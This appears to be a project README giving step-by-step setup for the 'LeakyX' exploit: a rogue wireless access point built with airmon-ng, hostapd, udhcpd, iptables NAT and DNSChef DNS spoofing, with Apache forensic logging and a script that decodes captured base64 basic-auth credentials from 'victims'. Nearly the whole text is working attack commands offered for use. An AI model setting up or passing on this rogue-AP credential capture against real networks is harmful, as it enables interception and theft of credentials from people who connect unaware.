# leakyx

## Setup system for leakyx exploit
Reference: [LeakyX](https://litwinsaid.blogspot.ca/2017/08/leakyx-vulnerability-that-apple-and.html)
### Requirements:
 A host with an internet connection and a wireless card that support AP mode
 Note: If connecting to a public wireless network for internet connectivity make sure there are two wireless NICs on the system
 The following software packages
-Apache2 with mod_SSL and mod_log_forensic
-udhcpd
-DNSChef
-hostapd
## Begin
Update system and install required software
```sudo apt update && sudo apt upgrade
sudo apt-get install aircrack-ng byobu vim git hostapd udhcpd apache2
```
Enable apache2 mods
```
a2enmod ssl
a2enmod mod_log_forensic
```
edit /etc/apache2/apache2.conf to add the following line: 
```
ForensicLog ${APACHE_LOG_DIR}/forensic.log
```
restart apache2 service to make enabled mdoudles active
```service apache2 restart```

## Start the fun
bring up monitor interface
```
airmon-ng check kill && airmon-ng start wlan0
```
configure ip address on the monitor interface
```ip addr add 10.0.0.1/24 dev wlan0mon```

 begin IP forwarding and NAT  
 Be sure to replace eth0 and wlan0mon with your interfaces  eth0 is the internet connection wlan0mon is the AP interface
```
sysctl -w net.ipv4.ip_forward=1
iptables -t nat -F
iptables -F
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0mon -j ACCEPT 
```


Edit the files to update any IP addresses or interfaces to match your environment


###Start up the necessary services.  
I run these in byobu with a 4-pane layout to have eyes on victim transistion from the AP connections, dhcp assignment, and then the dnschef proxy/cooking data.
```
byobu
press ctrl-F2 for horizontal split,
ctrl-F1 for vertical split, and 
ctrl-F2 for another horizontal split
```

Commands to bring up services: 
```
hostapd hostapd.conf
udhcpd -f dhcpd.conf
dnschef --file dnschef.ini -i 10.0.0.1
```

Begin monitoring the forensic file
```
tail -f /var/log/apache2/forensic.log
```
or you can use the tail-log.py script to parse the forensic log and decode the base64 encoded basic:auth attempts
```
python tail-log.py
```
